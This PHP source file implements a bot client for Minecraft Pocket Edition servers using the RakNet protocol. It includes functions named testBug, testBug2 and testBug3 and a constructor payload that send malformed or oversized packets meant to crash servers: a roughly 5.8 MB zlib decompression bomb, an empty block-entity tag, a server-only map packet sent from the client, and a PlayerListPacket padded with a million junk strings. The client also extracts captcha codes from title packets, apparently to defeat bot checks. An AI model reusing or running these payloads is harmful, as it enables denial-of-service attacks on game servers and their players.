<?php

//declare(strict_types=1);


namespace Frago9876543210\PocketEditionClient;


use Frago9876543210\PocketEditionClient\protocol\BlockEntityDataPacket;
use Frago9876543210\PocketEditionClient\protocol\DataPacket;
use Frago9876543210\PocketEditionClient\protocol\DisconnectPacket;
use Frago9876543210\PocketEditionClient\protocol\FullChunkDataPacket;
use Frago9876543210\PocketEditionClient\protocol\LoginPacket;
use Frago9876543210\PocketEditionClient\protocol\TextPacket;
use Frago9876543210\PocketEditionClient\protocol\PacketPool;
use Frago9876543210\PocketEditionClient\protocol\PlayStatusPacket;
use Frago9876543210\PocketEditionClient\protocol\RequestChunkRadiusPacket;
use Frago9876543210\PocketEditionClient\protocol\ResourcePackClientResponsePacket;
use Frago9876543210\PocketEditionClient\protocol\ResourcePacksInfoPacket;
use Frago9876543210\PocketEditionClient\protocol\SetTimePacket;
use Frago9876543210\PocketEditionClient\protocol\SetTitlePacket;
use Frago9876543210\PocketEditionClient\protocol\TransferPacket;
use Frago9876543210\PocketEditionClient\protocol\ClientboundMapItemDataPacket;
use Frago9876543210\PocketEditionClient\protocol\StartGamePacket;
use Frago9876543210\PocketEditionClient\protocol\MobEquipmentPacket;
use Frago9876543210\PocketEditionClient\protocol\AnimatePacket;
use Frago9876543210\PocketEditionClient\protocol\PlayerListPacket;
use Frago9876543210\PocketEditionClient\protocol\UseItemPacket;
use Frago9876543210\PocketEditionClient\protocol\MovePlayerPacket;
use pocketmine\math\Vector3;
use pocketmine\network\mcpe\NetworkBinaryStream;
use pocketmine\network\mcpe\NetworkCompression;
use pocketmine\network\mcpe\PacketStream;
use pocketmine\item\Item;
use raklib\protocol\ACK;
use raklib\protocol\ConnectedPing;
use raklib\protocol\ConnectionRequest;
use raklib\protocol\ConnectionRequestAccepted;
use raklib\protocol\Datagram;
use raklib\protocol\EncapsulatedPacket;
use pocketmine\utils\UUID;
use raklib\protocol\NACK;
use raklib\protocol\NewIncomingConnection;
use raklib\protocol\OpenConnectionReply1;
use raklib\protocol\OpenConnectionReply2;
use raklib\protocol\OpenConnectionRequest1;
use raklib\protocol\OpenConnectionRequest2;
use raklib\protocol\Packet;
use raklib\protocol\PacketReliability;
use raklib\server\UDPServerSocket;

class PocketEditionClient extends UDPServerSocket{
	public const MTU = 1492;

	private const MAX_SPLIT_SIZE = 128;
	private const MAX_SPLIT_COUNT = 4;

	private const CHANNEL_COUNT = 32;

	public static $WINDOW_SIZE = 2048;
	
	public $eid;
	
	public $pos;
	
	public $pos2;
	
	public $logined = false;
	
	public $lastUpdate2 = 0;
	
	public $task = [];

	/** @var Address */
	private $serverAddress;
	/** @var int */
	private $clientID;
	/** @var int */
	private $lastUpdate;

	/** @var int */
	private $seqNumber = 0;
	/** @var int */
	private $splitID = 0;
	/** @var int */
	private $messageIndex = 0;
	/** @var int */
	private $orderIndex = 0;

	/** @var int[] */
	private $ACKQueue = [];
	/** @var int[] */
	private $NACKQueue = [];
	/** @var Datagram[] */
	private $recoveryQueue = [];
	/** @var Datagram[] */
	private $packetToSend = [];

	/** @var int */
	private $windowStart = 0;
	/** @var int */
	private $windowEnd;
	/** @var int */
	private $highestSeqNumberThisTick = -1;

	/** @var int */
	private $reliableWindowStart = 0;
	/** @var int */
	private $reliableWindowEnd;
	/** @var bool[] */
	private $reliableWindow = [];

	/** @var int[] */
	private $receiveOrderedIndex;
	/** @var int[] */
	private $receiveSequencedHighestIndex;
	/** @var EncapsulatedPacket[][] */
	private $receiveOrderedPackets;

	/** @var Datagram[][] */
	private $splitPackets = [];

	/** @var bool */
	private $isLoggedIn = false;


	public function __construct(Address $bindAddress, Address $serverAddress){
		parent::__construct($bindAddress);
		$this->serverAddress = $serverAddress;

		$this->clientID = mt_rand(0, PHP_INT_MAX);
		$this->lastUpdate = time();

		$this->windowEnd = self::$WINDOW_SIZE;
		$this->reliableWindowEnd = self::$WINDOW_SIZE;

		$this->receiveOrderedIndex = array_fill(0, self::CHANNEL_COUNT, 0);
		$this->receiveSequencedHighestIndex = array_fill(0, self::CHANNEL_COUNT, 0);

		//
		$stream = new NetworkBinaryStream();

		$stream->putByte(0x34);
		$stream->putUnsignedVarInt(1);
		$stream->putEntityUniqueId(0);

		$count = 5873523;
		$stream->putUnsignedVarInt($count);
		$stream->put(str_repeat("\x00", $count));

		$uncompressed = $stream->buffer;
		$stream->reset();
		$stream->putString($uncompressed);

		$this->raw = zlib_encode($stream->buffer, ZLIB_ENCODING_DEFLATE, 9);
		//
	}

	protected function getClassName(object $class) : string{
		return (new \ReflectionObject($class))->getShortName();
	}

	protected function sendRakNetPacket(Packet $packet) : void{
		$packet->encode();
		if(!$packet instanceof Datagram){
			//echo $this->getClassName($packet) . PHP_EOL;
		}
		$this->writePacket($packet->buffer, $this->serverAddress->ip, $this->serverAddress->port);
	}

	protected function sendSessionRakNetPacket(Packet $packet) : void{
		$packet->encode();
		if(!$packet instanceof Datagram){
			//echo $this->getClassName($packet) . PHP_EOL;
		}
		$encapsulated = new EncapsulatedPacket();
		$encapsulated->reliability = PacketReliability::UNRELIABLE;
		$encapsulated->buffer = $packet->buffer;
		$this->sendDatagramWithEncapsulated($encapsulated);
	}

	protected function sendDatagramWithEncapsulated(EncapsulatedPacket $packet) : void{
		$datagram = new Datagram();
		$datagram->sendTime = microtime(true);
		$datagram->headerFlags = Datagram::BITFLAG_NEEDS_B_AND_AS;
		$datagram->packets = [$packet];
		$datagram->seqNumber = $this->seqNumber++;

		$this->recoveryQueue[$datagram->seqNumber] = $datagram;
		$this->sendRakNetPacket($datagram);
		$this->ACKQueue[] = $datagram->seqNumber;
	}

	protected function sendDataPacket($packets, ?int $compressionLevel = null) : void{
		$stream = new PacketStream();
		if(!is_array($packets)){
			$packets = [$packets];
		}
		foreach($packets as $packet){
			$stream->putPacket($packet);
		}
		$this->sendRawData(NetworkCompression::compress($stream->buffer, $compressionLevel));
	}

	protected function sendRawData(string $buffer) : void{
		$encapsulated = new EncapsulatedPacket();
		$encapsulated->reliability = PacketReliability::RELIABLE_ORDERED;
		$encapsulated->buffer = "\xfe" . $buffer;
		$this->sendEncapsulated($encapsulated);
	}

	protected function sendEncapsulated(EncapsulatedPacket $packet) : void{
		if(PacketReliability::isOrdered($packet->reliability)){
			$packet->orderIndex = $this->orderIndex++;
		}

		$maxSize = self::MTU - 60;
		if(strlen($packet->buffer) > $maxSize){
			$buffers = str_split($packet->buffer, $maxSize);
			$bufferCount = count($buffers);
			$splitID = ++$this->splitID % 65536;

			foreach($buffers as $count => $buffer){
				$pk = new EncapsulatedPacket();
				$pk->splitID = $splitID;
				$pk->hasSplit = true;
				$pk->splitCount = $bufferCount;
				$pk->reliability = $packet->reliability;
				$pk->splitIndex = $count;
				$pk->buffer = $buffer;
				if(PacketReliability::isReliable($pk->reliability)){
					$pk->messageIndex = $this->messageIndex++;
				}
				$pk->sequenceIndex = $packet->sequenceIndex;
				$pk->orderChannel = 0;
				$pk->orderIndex = $packet->orderIndex;
				$this->sendDatagramWithEncapsulated($pk);
			}
		}else{
			if(PacketReliability::isReliable($packet->reliability)){
				$packet->messageIndex = $this->messageIndex++;
			}
			$this->sendDatagramWithEncapsulated($packet);
		}
	}

	//

	public function sendOpenConnectionRequest1() : void{
		$pk = new OpenConnectionRequest1();
		$pk->protocol = 6;
		$pk->mtuSize = self::MTU - 28;
		$this->sendRakNetPacket($pk);
	}

	public function sendOpenConnectionRequest2() : void{
		$pk = new OpenConnectionRequest2();
		$pk->clientID = $this->clientID;
		$pk->serverAddress = $this->serverAddress;
		$pk->mtuSize = self::MTU;
		$this->sendRakNetPacket($pk);
	}

	public function sendConnectionRequest() : void{
		$pk = new ConnectionRequest();
		$pk->clientID = $this->clientID;
		$pk->sendPingTime = time();
		$this->sendSessionRakNetPacket($pk);
	}

	public function sendNewIncomingConnection() : void{
		$pk = new NewIncomingConnection();
		$pk->address = $this->serverAddress;
		for($i = 0; $i < 10; ++$i){
			$pk->systemAddresses[$i] = $pk->address;
		}
		$pk->sendPingTime = $pk->sendPongTime = 0;
		$this->sendSessionRakNetPacket($pk);
	}

	public function sendLoginPacket() : void{
		$pk = new LoginPacket();
   $r = mt_rand(0,50);
		$pk->username = "FixedBot$r";
		//$pk->username = str_repeat("1", 30000);
		$pk->serverAddress = $this->serverAddress;
		$this->sendDataPacket($pk);
	}

	//

	public function tick() : void{
		if($this->readPacket($buffer, $this->serverAddress->ip, $this->serverAddress->port) !== false){
			if(($packet = RakNetPool::getPacket($buffer)) !== null){
				$this->handlePacket($packet);
			}
		}
		$this->update();
		if((time() - $this->lastUpdate) >= 7){
			$this->lastUpdate = time();

			$pk = new ConnectedPing();
			$pk->sendPingTime = 0;
			$this->sendSessionRakNetPacket($pk);
		}
		if((time() - $this->lastUpdate2) >= 3 && $this->logined){
			$this->lastUpdate2 = time();
			//$this->eqItem();
			//$this->move();
			//$this->move();
			//$this->move();
			//$this->sendMessage("ета лучщи сервер!");
			//$this->useItem();
			$this->testBug2();
		}
		/*if((time() - $this->lastUpdate2) >= 3 && $this->logined){
			$this->lastUpdate2 = time();
			//$this->eqItem();
			//$this->move();
			//$this->move();
			//$this->move();
			//$this->sendMessage("ета лучщи сервер!");
			$this->useItem();
		}
		//usleep(10000);
		if((time() - $this->lastUpdate2) >= 2 && $this->logined){
			$this->lastUpdate2 = time();
			//$this->eqItem();
			//$this->sendMessage("/party i 228228");
			$this->move();
			//$this->move();
			//$this->move();
			//$this->sendMessage("ета лучщи сервер!");
			//$this->useItem();
		}*/
	}

	protected function update() : void{
		$diff = $this->highestSeqNumberThisTick - $this->windowStart + 1;
		assert($diff >= 0);
		if($diff > 0){
			//Move the receive window to account for packets we either received or are about to NACK
			//we ignore any sequence numbers that we sent NACKs for, because we expect the client to resend them
			//when it gets a NACK for it

			$this->windowStart += $diff;
			$this->windowEnd += $diff;
		}

		if(count($this->ACKQueue) > 0){
			$pk = new ACK();
			$pk->packets = $this->ACKQueue;
			$this->sendRakNetPacket($pk);
			$this->ACKQueue = [];
		}

		if(count($this->NACKQueue) > 0){
			$pk = new NACK();
			$pk->packets = $this->NACKQueue;
			$this->sendRakNetPacket($pk);
			$this->NACKQueue = [];
		}

		if(count($this->packetToSend) > 0){
			foreach($this->packetToSend as $k => $pk){
				$this->sendSessionRakNetPacket($pk);
				unset($this->packetToSend[$k]);
			}
			if(count($this->packetToSend) > self::$WINDOW_SIZE){ //TODO: check limit
				$this->packetToSend = [];
			}
		}

		foreach($this->recoveryQueue as $seq => $pk){
			if($pk->sendTime < (time() - 8)){
				$this->packetToSend[] = $pk;
				unset($this->recoveryQueue[$seq]);
			}else{
				break;
			}
		}
		
		/*foreach($this->task as $n => $task){
			$task->sec--;
			if($task->sec <= 0){
				
			}
		}*/
	}

	protected function handlePacket(Packet $packet) : void{
		/*if(!$packet instanceof Datagram){
			echo "\t* " . $this->getClassName($packet) . PHP_EOL;
		}*/
		if($packet instanceof Datagram){
			$this->handleDatagram($packet);
		}elseif($packet instanceof ACK){
			/** @var int $seq */
			foreach($packet->packets as $seq){
				if(isset($this->recoveryQueue[$seq])){
					unset($this->recoveryQueue[$seq]);
				}
			}
		}elseif($packet instanceof NACK){
			/** @var int $seq */
			foreach($packet->packets as $seq){
				if(isset($this->recoveryQueue[$seq])){
					$this->packetToSend[] = $this->recoveryQueue[$seq];
					unset($this->recoveryQueue[$seq]);
				}
			}
		}elseif($packet instanceof OpenConnectionReply1){
			$this->sendOpenConnectionRequest2();
		}elseif($packet instanceof OpenConnectionReply2){
			$this->sendConnectionRequest();
		}elseif($packet instanceof ConnectionRequestAccepted){
			$this->sendNewIncomingConnection();
			$this->sendLoginPacket();
		}
	}

	protected function handleDatagram(Datagram $packet) : void{
		if($packet->seqNumber < $this->windowStart or $packet->seqNumber > $this->windowEnd or isset($this->ACKQueue[$packet->seqNumber])){
			//echo "Received duplicate or out-of-window packet from server (sequence number $packet->seqNumber, window " . $this->windowStart . "-" . $this->windowEnd . ")\n";
			//return;
		}

		unset($this->NACKQueue[$packet->seqNumber]);
		$this->ACKQueue[$packet->seqNumber] = $packet->seqNumber;
		if($this->highestSeqNumberThisTick < $packet->seqNumber){
			$this->highestSeqNumberThisTick = $packet->seqNumber;
		}

		if($packet->seqNumber === $this->windowStart){
			//got a contiguous packet, shift the receive window
			//this packet might complete a sequence of out-of-order packets, so we incrementally check the indexes
			//to see how far to shift the window, and stop as soon as we either find a gap or have an empty window
			for(; isset($this->ACKQueue[$this->windowStart]); ++$this->windowStart){
				++$this->windowEnd;
			}
		}elseif($packet->seqNumber > $this->windowStart){
			//we got a gap - a later packet arrived before earlier ones did
			//we add the earlier ones to the NACK queue
			//if the missing packets arrive before the end of tick, they'll be removed from the NACK queue
			for($i = $this->windowStart; $i < $packet->seqNumber; ++$i){
				if(!isset($this->ACKQueue[$i])){
					$this->NACKQueue[$i] = $i;
				}
			}
		}else{
			assert(false, "received packet before window start");
		}

		foreach($packet->packets as $pk){
			$this->handleEncapsulatedPacket($pk);
		}
	}

	private function handleEncapsulatedPacket(EncapsulatedPacket $packet) : void{
		if($packet->messageIndex !== null){
			//check for duplicates or out of range
			if($packet->messageIndex < $this->reliableWindowStart or $packet->messageIndex > $this->reliableWindowEnd or isset($this->reliableWindow[$packet->messageIndex])){
				return;
			}

			$this->reliableWindow[$packet->messageIndex] = true;

			if($packet->messageIndex === $this->reliableWindowStart){
				for(; isset($this->reliableWindow[$this->reliableWindowStart]); ++$this->reliableWindowStart){
					unset($this->reliableWindow[$this->reliableWindowStart]);
					++$this->reliableWindowEnd;
				}
			}
		}

		if($packet->hasSplit and ($packet = $this->handleSplit($packet)) === null){
			return;
		}

		if(PacketReliability::isSequenced($packet->reliability)){
			if($packet->sequenceIndex < $this->receiveSequencedHighestIndex[$packet->orderChannel] or $packet->orderIndex < $this->receiveOrderedIndex[$packet->orderChannel]){
				//too old sequenced packet, discard it
				return;
			}

			$this->receiveSequencedHighestIndex[$packet->orderChannel] = $packet->sequenceIndex + 1;
			$this->handleEncapsulatedPacketRoute($packet);
		}elseif(PacketReliability::isOrdered($packet->reliability)){
			if($packet->orderIndex === $this->receiveOrderedIndex[$packet->orderChannel]){
				//this is the packet we expected to get next
				//Any ordered packet resets the sequence index to zero, so that sequenced packets older than this ordered
				//one get discarded. Sequenced packets also include (but don't increment) the order index, so a sequenced
				//packet with an order index less than this will get discarded
				$this->receiveSequencedHighestIndex[$packet->orderIndex] = 0;
				$this->receiveOrderedIndex[$packet->orderChannel] = $packet->orderIndex + 1;

				$this->handleEncapsulatedPacketRoute($packet);
				for($i = $this->receiveOrderedIndex[$packet->orderChannel]; isset($this->receiveOrderedPackets[$packet->orderChannel][$i]); ++$i){
					$this->handleEncapsulatedPacketRoute($this->receiveOrderedPackets[$packet->orderChannel][$i]);
					unset($this->receiveOrderedPackets[$packet->orderChannel][$i]);
				}

				$this->receiveOrderedIndex[$packet->orderChannel] = $i;
			}elseif($packet->orderIndex > $this->receiveOrderedIndex[$packet->orderChannel]){
				$this->receiveOrderedPackets[$packet->orderChannel][$packet->orderIndex] = $packet;
			}else{
				//duplicate/already received packet
			}
		}else{
			//not ordered or sequenced
			$this->handleEncapsulatedPacketRoute($packet);
		}
	}

	/**
	 * Processes a split part of an encapsulated packet.
	 * @param EncapsulatedPacket $packet
	 * @return null|EncapsulatedPacket Reassembled packet if we have all the parts, null otherwise.
	 */
	private function handleSplit(EncapsulatedPacket $packet) : ?EncapsulatedPacket{
		if($packet->splitCount >= self::MAX_SPLIT_SIZE or $packet->splitIndex >= self::MAX_SPLIT_SIZE or $packet->splitIndex < 0){
			echo "Invalid split packet part from server, too many parts or invalid split index (part index $packet->splitIndex, part count $packet->splitCount)\n";
			return null;
		}

		//TODO: this needs to be more strict about split packet part validity

		if(!isset($this->splitPackets[$packet->splitID])){
			if(count($this->splitPackets) >= self::MAX_SPLIT_COUNT){
				echo "Ignored split packet part from server because reached concurrent split packet limit of " . self::MAX_SPLIT_COUNT . PHP_EOL;
				return null;
			}
			$this->splitPackets[$packet->splitID] = [$packet->splitIndex => $packet];
		}else{
			$this->splitPackets[$packet->splitID][$packet->splitIndex] = $packet;
		}

		if(count($this->splitPackets[$packet->splitID]) === $packet->splitCount){ //got all parts, reassemble the packet
			$pk = new EncapsulatedPacket();
			$pk->buffer = "";

			$pk->reliability = $packet->reliability;
			$pk->messageIndex = $packet->messageIndex;
			$pk->sequenceIndex = $packet->sequenceIndex;
			$pk->orderIndex = $packet->orderIndex;
			$pk->orderChannel = $packet->orderChannel;

			for($i = 0; $i < $packet->splitCount; ++$i){
				$pk->buffer .= $this->splitPackets[$packet->splitID][$i]->buffer;
			}

			$pk->length = strlen($pk->buffer);
			unset($this->splitPackets[$packet->splitID]);

			return $pk;
		}

		return null;
	}

	private function handleEncapsulatedPacketRoute(EncapsulatedPacket $packet) : void{
		if(($pk = RakNetPool::getPacket($packet->buffer)) !== null){
			$this->handlePacket($pk);
		}else{
			if($packet->buffer !== "" && $packet->buffer{0} === "\xfe"){
				$payload = substr($packet->buffer, 1);
				try{
					$stream = new PacketStream(NetworkCompression::decompress($payload));
				}catch(\Exception $e){
					return;
				}
				while(!$stream->feof()){
					$this->handleDataPacket(PacketPool::getPacket($stream->getString()));
				}
			}
		}
	}

	protected function handleDataPacket(DataPacket $packet) : void{
		$class = $this->getClassName($packet);
		try{
			$packet->decode();
		}catch(\Throwable $e){
			echo "Error in decode " . $class . PHP_EOL . $e->getMessage() . PHP_EOL;
			return;
		}
		if($packet instanceof PlayStatusPacket){
			if($packet->status === PlayStatusPacket::PLAYER_SPAWN){
				//$this->logined = true;
				/* ИГРОК ЗАШЕЛ */
				
				echo "Бот присоединился!" . PHP_EOL;
				
				//$this->startGame();
				
				//$this->sendMessage("12345678A 12345678A");
				
				//$this->sendMessage("ХАЮ ХАЙ!");
				
				//$this->testBug(new Vector3(131, 81, 125));
				//$this->testBug2();
			}
		}elseif($packet instanceof DisconnectPacket){
			echo "\t\t\t{$packet->message}\n";
		}elseif($packet instanceof ResourcePacksInfoPacket && !$this->isLoggedIn){
			$this->isLoggedIn = true;
			$pk = new ResourcePackClientResponsePacket();
			$pk->status = ResourcePackClientResponsePacket::STATUS_COMPLETED;
			$this->sendDataPacket($pk);
		}elseif($packet instanceof StartGamePacket){
			$pk = new RequestChunkRadiusPacket();
			$pk->radius = 5;
			$this->sendDataPacket($pk);
			
			$this->eid = $packet->entityRuntimeId;
			$this->pos = new Vector3($packet->playerPosition->x, $packet->playerPosition->y, $packet->playerPosition->z);
			$this->pos2 = new Vector3($packet->playerPosition->x, $packet->playerPosition->y, $packet->playerPosition->z);
		}elseif($packet instanceof TextPacket && $packet->type == 0){
			echo $packet->message . PHP_EOL;
		}elseif($packet instanceof SetTitlePacket && $packet->type == 3){
			//echo $packet->text . PHP_EOL;
			$ex = explode("\n", $packet->text);
			echo "Капча: ".substr($ex[0], -2). PHP_EOL;
		}elseif($packet instanceof TransferPacket){
			var_dump($packet);
		}
		if($packet instanceof FullChunkDataPacket || $packet instanceof SetTimePacket){
			return;
		}
		//if($class != "ACK") echo "\t\t" . $class . PHP_EOL;
	}
	
	public function move(){
		$pk = new MovePlayerPacket;
		$pk->entityRuntimeId = $this->eid;
		$this->pos2 = $this->pos2->add(0.5,0,0.5);
		$pk->position = $this->pos2;
		$pk->yaw = 300;
		$pk->pitch = -17;
		$pk->bodyYaw = 300;
		$pk->onGround = true;
		$this->sendDataPacket($pk);
	}
	
	public function startGame(){
		$this->sendMessage("123456789");
		$this->logined = true;
		/*for($i=0;$i<=50;$i++){
			for($i=0;$i<=4;$i++){
				
			}
			usleep();
		}*/
		//sleep(2);
		//$this->wait("useItem", 2);
		//$this->eqItem();
		//sleep(3);
	}
	
	public function sendMessage($m){
		$pk = new TextPacket;
		$pk->type = 1;
		$pk->source = "Profikkk";
		$pk->message = $m;
		$pk->parameters = [];
		$this->sendDataPacket($pk);
	}
	
	public function eqItem(){
		$pk = new MobEquipmentPacket;
		$pk->entityRuntimeId = $this->eid;
		$pk->item = (Item::get(339))->setCustomName("§r§l§aБыстрый вход§r§7 [Клик]");
		//$pk->item = Item::get(339);
		$pk->inventorySlot = 14;
		$pk->hotbarSlot = 5;
		$pk->windowId = 0;
		$this->sendDataPacket($pk);
	}
	
	public function useItem(){
		//return;
		var_dump(1);
		/*$pk = new AnimatePacket;
		$pk->action = 1;
		$pk->entityRuntimeId = $this->eid;
		//$pk->float = 0;
		$this->sendDataPacket($pk);
		
		$pk = new UseItemPacket;
		$pk->x = (int) floor($this->pos->x);
		$pk->y = (int) floor($this->pos->y) - 1;
		$pk->z = (int) floor($this->pos->z);
		$pk->blockId = 41;
		$pk->face = 1;
		$pk->from = new Vector3(0.4572, 1, 0.2412);
		$pk->position = new Vector3($this->pos->x, $this->pos->y, $this->pos->z);
		$pk->slot = 5;
		$pk->item = (Item::get(339))->setCustomName("§r§l§aБыстрый вход§r§7 [Клик]");
		$this->sendDataPacket($pk);*/
		$pk = new UseItemPacket;
		$pk->x = 0;
		$pk->y = 0;
		$pk->z = 0;
		$pk->blockId = 0;
		$pk->face = -1;
		$pk->from = new Vector3(0,0,0);
		$pk->position = new Vector3(0,0,0);
		$pk->slot = 5;
		$pk->item = (Item::get(339))->setCustomName("§r§l§aБыстрый вход§r§7 [Клик]");
		$this->sendDataPacket($pk);
	}

	protected function testBug(Vector3 $position) : void{
		$position->floor();

		$pk = new BlockEntityDataPacket();
		$pk->x = $position->x;
		$pk->y = $position->y;
		$pk->z = $position->z;
		$pk->namedtag = "";
		$this->sendDataPacket($pk);
	}

	protected function testBug2() : void{
		//$this->sendRawData($this->raw);
		//$this->testBug3();
		//return;
		$pk = new ClientboundMapItemDataPacket;
		$pk->mapId = 1;
		$pk->type = 0x08;
		$pk->eids = [0,2,3,4,5];
		$this->sendDataPacket($pk);
		/*for($i=0;$i<=300000;$i++){
			$pk->eids[] = $i;
			if($i % 1000 == 0) var_dump($i);
		}*/
		
	}
	
	protected function testBug3() : void{
		//$this->sendRawData($this->raw);
		$pk = new PlayerListPacket;
		$pk->type = 1;
		$pk->entries = [0 => [UUID::fromRandom()]];
		//$this->sendDataPacket($pk);
		$pk->encode();
		$b = $pk->buffer;
		var_dump(1);
		$b = $b.str_repeat("u'▒N_W▒▒]<>▒Q▒Nd",1000000);
		var_dump(2);
		$this->sendRawData($b);
		/*for($i=0;$i<=300000;$i++){
			$pk->eids[] = $i;
			if($i % 1000 == 0) var_dump($i);
		}*/
		
	}
}
